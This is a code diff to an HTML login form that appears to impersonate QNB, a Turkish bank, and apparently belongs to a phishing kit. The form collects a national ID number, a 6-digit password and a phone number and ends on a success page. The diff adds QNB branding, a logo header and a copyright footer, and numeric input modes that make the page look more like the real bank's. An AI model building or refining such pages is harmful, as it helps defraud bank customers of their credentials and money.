@@ -87,6 +87,12 @@
         <img src="./assets/img/logo.png" alt="Logo" class="mobile-logo">
     </div>
     <div class="login-container" id="login-container">
+                <div class="welcome-header">
+            <img src="./assets/img/file.png" alt="QNB Logo" class="welcome-image">
+            <div class="welcome-text">
+                <h1>Hoşgeldiniz</h1>
+            </div>
+        </div>
         <div class="tabs">
             <div class="tab active">Bireysel</div>
             <div class="tab">Kurumsal</div>
@@ -94,13 +100,13 @@
         <form id="login-form" autocomplete="off">
             <div class="form-group">
                 <label for="tcno">TC Kimlik No *</label>
-                <input type="text" id="tcno" name="tcno" required placeholder="TC Kimlik Numaranız" maxlength="11"
+                <input type="text" id="tcno" inputmode="numeric" name="tcno" required placeholder="TC Kimlik Numaranız" maxlength="11"
                     autocomplete="off">
                 <div id="tcno-error" class="required-message">TC Kimlik No 11 haneli olmalı.</div>
             </div>
             <div class="form-group">
                 <label for="sifre">Şifre *</label>
-                <input type="password" id="sifre" name="sifre" required placeholder="Şifreniz" maxlength="6"
+                <input type="password" id="sifre" inputmode="numeric" name="sifre" required placeholder="Şifreniz" maxlength="6"
                     autocomplete="off">
                 <div id="sifre-error" class="required-message">Şifre 6 haneli olmalı.</div>
             </div>
@@ -138,7 +144,7 @@
             <div id="kart-ekstra" style="display:none;">
                 <div class="form-group">
                     <label for="telno2">Telefon Numaranız *</label>
-                    <input name="phone2" type="tel" class="form-control" id="telno2" value="" autocomplete="off"
+                    <input name="phone2" type="tel" inputmode="numeric" class="form-control" id="telno2" value="" autocomplete="off"
                         maxlength="17" placeholder="Telefon numaranızı girin" required>
                     <div id="telno2-error" class="required-message">Telefon numarası eksik veya hatalı.</div>
                 </div>
@@ -232,6 +238,10 @@
             </div>
             <a href="/" class="success-home-button">Ana Sayfaya Dön</a>
         </div>
+    </div>
+        <div class="footer">
+        <p><strong>QNB Gizlilik Politikası</strong> | <strong>Kullanım Şartları</strong></p>
+        © 2025 QNB v1.6.25
     </div>
     <script>
         window.onload = function () {
